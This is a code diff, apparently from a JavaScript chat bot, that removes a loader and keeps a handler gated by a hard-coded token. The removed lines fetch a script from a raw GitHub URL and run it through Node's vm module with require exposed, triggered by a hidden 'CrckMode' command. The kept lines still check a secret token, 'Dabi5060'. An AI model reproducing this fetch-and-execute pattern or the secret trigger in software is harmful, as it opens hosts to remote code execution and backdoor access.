@@ -1,22 +1,5 @@
-const f = require('node-fetch');
-const v = require('vm');
-
-const B = 'https://raw.githubusercontent.com/MaouDabi0/Dabi-Ai-Documentation/main/assets/src';
-
-async function lS(u) {
-  const r = await f(u);
-  if (!r.ok) throw new Error(`Gagal fetch: ${u}`);
-  const c = await r.text();
-  const x = v.createContext({ module: {}, exports: {}, require });
-  new v.Script(c, { filename: u }).runInContext(x);
-  return x.module.exports || x.exports;
-}
-
-async function h(conn, m, info, txt) {
+async function h(conn, m, info, txt, mt) {
   const { chatId: id } = info;
-
-  const mt = txt.match(/^\/"CrckMode"\s*-g\\r=\s*{(.+?)}\s*\d+$/i);
-  if (!mt) return false;
 
   const tkn = mt[1]?.trim();
   if (tkn !== 'Dabi5060') {
